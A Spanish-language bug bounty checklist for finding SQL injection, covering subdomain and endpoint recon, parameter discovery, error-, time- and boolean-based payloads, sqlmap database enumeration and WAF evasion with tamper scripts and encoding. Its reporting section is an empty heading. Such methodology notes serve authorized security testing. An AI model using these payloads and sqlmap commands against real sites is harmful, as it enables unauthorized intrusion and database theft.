---
tags:
  - BugBounty
---
---
✅ **Fase 1:** Recolección de información  
✅ **Fase 2:** Identificación de parámetros  
✅ **Fase 3:** Pruebas manuales de SQLi  
✅ **Fase 4:** Confirmación con SQLi time-based y boolean-based  
✅ **Fase 5:** Automatización con `sqlmap`  
✅ **Fase 6:** Evasión de WAFs  
✅ **Fase 7:** Reporte con pruebas y recomendaciones

---

#  1️⃣ RECONOCIMIENTO (RECON)

### Recolectar Subdominios y Endpoints

✔️ **Enumerar subdominios (Wildcard `*.example.com`)**

- **Herramientas:**
    
    ```bash
    amass enum -passive -d example.com
    subfinder -d example.com
    assetfinder --subs-only example.com
    ```
    

✔️ **Buscar endpoints ocultos**

- **Wayback Machine & CommonCrawl:**
    
    ```bash
    waybackurls example.com | tee urls.txt
    gau example.com | tee -a urls.txt
    ```
    
- **Google Dorks:**
    
    ```bash
    site:example.com inurl:php?id=
    site:example.com ext:php | ext:asp | ext:aspx | ext:jsp
    ```
    

✔️ **Extraer endpoints de JavaScript:**

```bash
katana -u https://example.com -jc -d 2 -o js_endpoints.txt
```

---

# 2️⃣ ENUMERACIÓN Y ANÁLISIS DE PARÁMETROS

### **📌 Identificar parámetros en URLs**

✔️ **Extraer y filtrar posibles parámetros vulnerables**

```bash
cat urls.txt | gf sqli | tee sqli_candidates.txt
```

✔️ **Enumerar parámetros ocultos**

```bash
paramspider -d example.com
```

✔️ **Buscar formularios y puntos de entrada en la web (Burp Suite, FFuF, dirsearch)**

```bash
ffuf -u https://example.com/FUZZ -w /path/to/common.txt
```

---




# 3️⃣ PRUEBAS DE INYECCIÓN SQL

### **📌 Identificar si hay filtrado de caracteres**

✔️ **Probar carga básica para ver si hay filtrado de comillas (`'`)**

```bash
curl "https://example.com/page.php?id=1'"
```

✔️ **Detectar si hay algún WAF activo**

```bash
wafw00f https://example.com
```

### **📌 SQLi Clásica (Error-Based)**

✔️ **Probar inyecciones con errores de SQL visibles**

```bash
id=1' --  
id=1' OR 1=1 --  
id=1' ORDER BY 10 --  
```

✔️ **Forzar errores de SQL para detectar si hay una base de datos detrás**

```bash
id=1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --  
```

---

# SQLi BASADA EN TIEMPO (TIME-BASED)

✔️ **Si la página sigue funcionando normalmente, probar con `SLEEP()`**

```bash
id=1' AND SLEEP(5) --  
id=1" AND SLEEP(5) --  
```

✔️ **Detectar retrasos en la carga con `time-based blind`**

```bash
id=1 AND IF(1=1, SLEEP(5), 0) --  
```

---

# 5️⃣ SQLi BASADA EN BOOLEANOS (BOOLEAN-BASED)

✔️ **Modificar consultas para provocar cambios en la página**

```bash
id=1' AND 1=1 -- (Carga normal)  
id=1' AND 1=2 -- (Debe cambiar)  
```

---

# 6️⃣ AUTOMATIZAR CON SQLMAP

✔️ **Probar automáticamente con `sqlmap`**

```bash
sqlmap -u "https://example.com/page.php?id=1" --dbs --batch --random-agent
```

✔️ **Si es una petición POST o JSON, usar `-r` con un archivo de Burp Suite**

```bash
sqlmap -r request.txt --dbs --batch
```

---

# 7️⃣ EVADIR FIREWALLS Y WAFs

✔️ **Usar técnicas de evasión de WAFs**

```bash
sqlmap -u "https://example.com/page.php?id=1" --dbs --tamper=space2comment,randomcase
```

✔️ **Codificar payloads manualmente (Hex, Unicode, Base64)**

```bash
id=0x31 -- (1 en hexadecimal)
id=1%27%20-- (1' -- en URL encoded)
```

---

# 8️⃣ INFORME Y RESPONSIBLE DISCLOSURE



